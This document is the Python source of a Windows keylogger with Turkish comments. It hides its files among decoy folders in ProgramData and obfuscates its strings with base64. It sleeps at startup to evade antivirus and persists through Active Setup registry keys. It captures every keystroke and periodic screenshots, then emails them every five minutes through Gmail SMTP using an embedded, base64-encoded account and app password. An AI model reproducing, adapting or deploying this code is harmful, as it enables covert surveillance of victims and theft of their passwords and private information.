import base64
import os
import smtplib
import time
import threading
import subprocess
import winreg
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput import keyboard
from PIL import ImageGrab
from email.mime.text import MIMEText
import random
import string
import sys
import io


time.sleep(10)  # GECİKME: AV'yi atlatmak için gecikme
smtp_gmail_com = base64.b64decode("c210cC5nbWFpbC5jb20=").decode() #ŞİFRELENDİ
log_txt = base64.b64decode("bG9nLnR4dA==").decode() #ŞİFRELENDİ
screen_png = base64.b64decode("c2NyZWVuLnBuZw==").decode() #ŞİFRELENDİ 
windowsuptade = base64.b64decode("V2luZG93c1VwdGFkZQ==").decode()  # ŞİFRELENDİ
securesystem = base64.b64decode("U2VjdXJlU3lzdGVt").decode()  # ŞİFRELENDİ
windows_defender_service = base64.b64decode("V2luZG93cyBEZWZlbmRlciBTZXJ2aWNl").decode()  # ŞİFRELENDİ


# ProgramData'da rastgele klasör oluştur
base_dir = r"C:\ProgramData"
random_folder = ''.join(random.choices(string.ascii_letters + string.digits, k=12))  # 12 karakterlik random isim
log_dir = os.path.join(base_dir, random_folder)
os.makedirs(log_dir, exist_ok=True)
subprocess.call(['attrib', '+h', log_dir], shell=True)

# Sahte klasörler oluşturuluyor
for _ in range(15):
    fake_folder = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    fake_path = os.path.join(base_dir, fake_folder)
    os.makedirs(fake_path, exist_ok=True)
    subprocess.call(['attrib', '+h', fake_path], shell=True)

    # Sahte dosya ismi ve yolu
    fake_file_name = ''.join(random.choices(string.ascii_letters, k=15)) + ".txt"
    fake_file_path = os.path.join(fake_path, fake_file_name)

    # %50 ihtimalle içi boş veya rastgele yazı dolu olacak
    if random.choice([True, False]):
        # Rastgele ciddi yazı
        fake_texts = [
            "System loaded successfully.",
            "Update registry initialized.",
            "Kernel security check passed.",
            "Service Host Update pending.",
            "User settings applied successfully."
        ]
        with open(fake_file_path, "w", encoding="utf-8") as f:
            f.write(random.choice(fake_texts))
    else:
        # Boş dosya oluştur
        open(fake_file_path, "w").close()

# Dikkat çekmeyen dosya adı üret (.dat uzantılı)
def generate_stealth_filename(extension="dat"):
    name = random.choice(["iconcache", "usbstack", "sysinfo", "fontloader", "drivemgr"])
    return f"{name}.{extension}"

# Log ve ekran görüntüsü dosya yolları
stealth_log_filename = generate_stealth_filename()
log_file = os.path.join(log_dir, stealth_log_filename)
screenshot_file = os.path.join(log_dir, "screen.png")  # Artık ekleniyor

# Log içeriğini şifrelemek için
def encode_data(data):
    return base64.b64encode(data.encode()).decode()

# Log içeriğini çözmek için (mail için)
def decode_data(data):
    return base64.b64decode(data.encode()).decode()

# Ekran görüntüsünü base64 encode et
def encode_image(image):
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    encoded_img = base64.b64encode(buffer.getvalue()).decode()
    return encoded_img

# Log + ekran görüntüsünü tek dosyaya yaz
def write_combined_log(log_text):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("---- BEGIN LOG ----\n")
            f.write(encode_data(log_text) + "\n")
            f.write("---- END LOG ----\n\n")

            screenshot = ImageGrab.grab()
            encoded_screen = encode_image(screenshot)

            f.write("---- BEGIN SCREEN ----\n")
            f.write(encoded_screen + "\n")
            f.write("---- END SCREEN ----\n")
    except Exception:
        pass

# Kayıt defteri ekleme
import winreg

def add_to_registry():

      # WOW6432 ACTİVE SETUP EKLENTİSİ(GİZLİ)
    try:
        name_64 = base64.b64decode("V2luQXV0bG9nRHI2NA==").decode()  # WinAutlogDr64
        stubpath = base64.b64decode("QzpcXFByb2dyYW1EYXRhXFN5c3RlbTMyXEF1ZGlvSG9zdFxhdWRpb2RyaXZlci5leGU=").decode()

        key_path_64 = fr"Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{name_64}"
        key64 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path_64)
        winreg.SetValueEx(key64, "StubPath", 0, winreg.REG_SZ, stubpath)
        winreg.SetValueEx(key64, "Version", 0, winreg.REG_SZ, "1,0")
        winreg.SetValueEx(key64, "Locale", 0, winreg.REG_SZ, "EN")
        winreg.CloseKey(key64)
    except:
        pass

    # ACTIVE SETUP eklentisi (base64 gizli)
    try:
        key_path = base64.b64decode("U29mdHdhcmVcXE1pY3Jvc29mdFxcQWN0aXZlIFNldHVwXFxJbnN0YWxsZWQgQ29tcG9uZW50c1xce0RDRTJBMDZDLUJGREEtNEU0Qy1CMzdELTMxNEIzQjdGM0QxMX0=").decode()
        stub_path = base64.b64decode("QzpcUHJvZ3JhbURhdGFcU3lzdGVtMzJcQXVkaW9Ib3N0XGF1ZGlvZHJpdmVyLmV4ZQ==").decode()
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "StubPath", 0, winreg.REG_SZ, stub_path)
        winreg.CloseKey(key)
    except:
        pass


# Logları maile gönder

import base64

def decode(data):
    return base64.b64decode(data).decode()

event_time = 300  # 5 dakika (300 saniye)
smtp_server = decode("c210cC5nbWFpbC5jb20=")      # smtp.gmail.com
email_address = decode("bWFobXV0MTQzMzFAZ21haWwuY29t")  # gmailinizi girin 
email_password = decode("amtscCB2bmNtIG1qc24gb2hrbQ==")  # uygulama şifrenizi girin
                                                           
def send_logs_email():
    try:
        if not os.path.exists(log_file):
            return

        if os.stat(log_file).st_size == 0:
            return

        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = email_address
        msg['Subject'] = "Keylogger Logs"

        # .dat dosyasına logları ekle
        try:
            with open(log_file, "rb") as f:
                dat_content = f.read()
                attachment = MIMEApplication(dat_content, _subtype="dat") # .encode()yok
                attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(log_file))
                msg.attach(attachment)
        except Exception:
            pass

          # SCREENSHOT: ekran görüntüsünü ayrı ekle (.png)
        try:
            with open(screenshot_file, "rb") as f:
                screenshot = f.read()
                attachment = MIMEApplication(screenshot, _subtype="png")
                attachment.add_header('Content-Disposition', 'attachment', filename="screen.png")
                msg.attach(attachment)
        except Exception:
            pass

        # Mail gönderimi
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        server.login(email_address, email_password)
        server.send_message(msg)
        server.quit()

    except Exception:
        pass

# Klavyeden tuş yakalama

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{key.name}]")

# Ekran görüntüsü alma

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_file)
    except:
        pass

# Otomatik mail gönderim döngüsü

def auto_send_loop():
    time.sleep(event_time)  # İlk başta hemen değil, 5 dk sonra başlasın!
    while True:
        take_screenshot()
        send_logs_email()
        time.sleep(event_time)

# Başlangıç fonksiyonu

def start():
    add_to_registry()
    threading.Thread(target=auto_send_loop, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()
